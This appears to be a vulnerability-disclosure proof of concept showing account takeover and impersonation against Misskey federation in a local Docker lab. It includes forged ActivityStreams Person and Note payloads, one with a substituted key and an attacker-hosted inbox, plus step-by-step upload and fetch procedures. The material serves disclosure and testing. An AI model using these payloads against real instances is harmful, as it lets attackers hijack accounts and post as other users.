## Misskey PoC

This PoC demonstrates a takeover attack and an impersonation attack against accounts on a remote Misskey instance.

### Environment

The PoC involves two Misskey instances and an HTTP server:

- `victim.poc.example`: A (open-registration) Misskey instance to which a supposed threat actor is going to upload fake Activity Streams documents:
  - `@attacker`: An account registered by the threat actor
  - `@takeoverVictim`: A target account of the takeover attack
  - `@impersonationVictim`: A target account of the impersonation attack
- `observer.poc.example`: A (open-registration) Misskey instance to fetch the fake objects
  - `@attacker`: An account registered by the threat actor
- `attacker.poc.example`: A server controlled by the threat actor to host intermediary Activity Streams documents (this is a simple static HTML server)

The Docker Compose project `docker-compose.yml` sets up these servers for you. Change the working directory to this directory and run the following to start the servers:

```sh
docker-compose up -d
```

### Prepare fake documents

First, execute the following command to get the Activity Streams actor URIs of the victim accounts:

```console
$ curl -K ../assets/curlrc -fH 'Accept: application/activity+json' 'https://victim.poc.example/@takeoverVictim' | jq -r '.id'
https://victim.poc.example/users/deadbeef1
$ curl -K ../assets/curlrc -fH 'Accept: application/activity+json' 'https://victim.poc.example/@impersonationVictim' | jq -r '.id'
https://victim.poc.example/users/deadbeef2
```

Take notes of these URIs as they are used in the next steps.

Next, upload the following fake object files to `@attacker@victim.poc.example`'s Drive and take note of the resulting Drive URLs. Before uploading the files, you need to replace the placeholder actor URIs with the actual ones (e.g. `sed 's/deadbeef1/[actual ID of @takeoverVictim]/g; s/deadbeef2/[actual ID of @impersonationVictim]/g'`).

```json
{
  "@context": [
    "https://www.w3.org/ns/activitystreams",
    "https://w3id.org/security/v1"
  ],
  "id": "https://victim.poc.example/users/deadbeef1",
  "type": "Person",
  "following": "https://victim.poc.example/users/deadbeef1/following",
  "followers": "https://victim.poc.example/users/deadbeef1/followers",
  "inbox": "https://attacker.poc.example/inbox",
  "outbox": "https://victim.poc.example/users/deadbeef1/outbox",
  "preferredUsername": "takeoverVictim",
  "name": "TAKEN OVER",
  "summary": "THE ACCOUNT HAS BEEN TAKEN OVER BY AN ATTACKER",
  "url": "https://victim.poc.example/@takeoverVictim",
  "published": "2015-02-10T15:04:55Z",
  "publicKey": {
    "id": "https://victim.poc.example/users/deadbeef1#main-key",
    "owner": "https://victim.poc.example/users/deadbeef1",
    "publicKeyPem": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkFqLkysr6pPyXj+O6ykx\nPMLhOe59JxZF1q2dDMWu9nnhHBxkfc0/bmCSrzjRoJrV+THbju1SZ9BXERABzKjy\nA+s561gE/9aPie22VuyCK//RcuIYhiQJ3HlCKa9w4+hLdXq7VwZ0OaZS5M4pLYls\nnD5UkWeSIMixsZS27ywZWUGY7taouuKKVGBPR6o8XcPz20VHZ5LWaGXiFvEO16Ch\n338fAqmcSOCigEL9dS9AguoJnx01028s7BqXvMb+GMer3V+W3uyNzLzHn9uXDiKe\nJ2a/lCRCGaENHXt30y0Zoq/Z4HgLYsyySKPHgNi+/xuKaFMsBGaMhK73lNd5G8TJ\ncwIDAQAB\n-----END PUBLIC KEY-----\n"
  }
}
```

```json
{
  "@context": "https://www.w3.org/ns/activitystreams",
  "id": "https://victim.poc.example/random-placeholder-to-avoid-accidental-id-collision/1",
  "type": "Note",
  "attributedTo": "https://victim.poc.example/users/deadbeef2",
  "content": "THE NOTE WAS MADE BY AN ATTACKER IMPERSONATING @impersonationVictim",
  "published": "2015-02-10T15:04:55Z",
  "to": "https://www.w3.org/ns/activitystreams#Public",
  "cc": "https://victim.poc.example/users/deadbeef2/followers"
}
```

In the subsequent steps, we assume that the documents have been uploaded to the following URLs:

- Fake Person: `https://victim.poc.example/files/deadbeef-badb-adba-dbad-aaaaaaaaaaaa`
- Fake Note: `https://victim.poc.example/files/deadbeef-badb-adba-dbad-000000000000`

`attacker.poc.example` in the Docker Compose project hosts the following intermediary Activity Streams documents, which contain the URIs of the fake Person and fake Note respectively. You need to edit these files to replace the placeholder URIs with the actual ones before performing the PoC.

- `https://attacker.poc.example/objects/notes/falsified-victim-mention.jsonld` ([`../assets/www/attacker.poc.example/objects/notes/falsified-victim-mention.jsonld`])
- `https://attacker.poc.example/objects/notes/fake-note-reply.jsonld` ([`../assets/www/attacker.poc.example/objects/notes/fake-note-reply.jsonld`])

### Fetch the remote objects

Now, we are all set. Let's fetch the fake objects to finally demonstrate the exploit.

Log in as `@attacker@observer.poc.example`, open the Lookup (照会) menu item and enter `https://attacker.poc.example/objects/notes/falsified-victim-mention.jsonld` to the input, which should display a Note mentioning `@takeoverVictim@victim.poc.example`. Follow the mentioned hyperlink, and you should see a user profile saying in CAPITAL LETTERS that the account has been taken over by an attacker, if the takeover attack was successful.

The takeover attack won't work if `observer.poc.example` has fetched the victim actor before. On the other hand, the impersonation attack is always applicable regardless of the Misskey instance's prior knowledge of the victim account. We'll demonstrate that in the following steps.

Open the Lookup menu item and enter `https://victim.poc.example/@impersonationVictim`, which should display the legitimate profile of `@impersonationVictim@victim.poc.example`. The instance should now be aware of the victim account.

Next, open the Lookup menu again and enter `https://attacker.poc.example/objects/notes/fake-note-reply.jsonld` this time. You should see a note replying to another note, which should be displayed as if it's from `@impersonationVictim@victim.poc.example` and be saying in CAPITAL LETTERS that it was made by an attacker impersonating the victim, if the attack was successful.
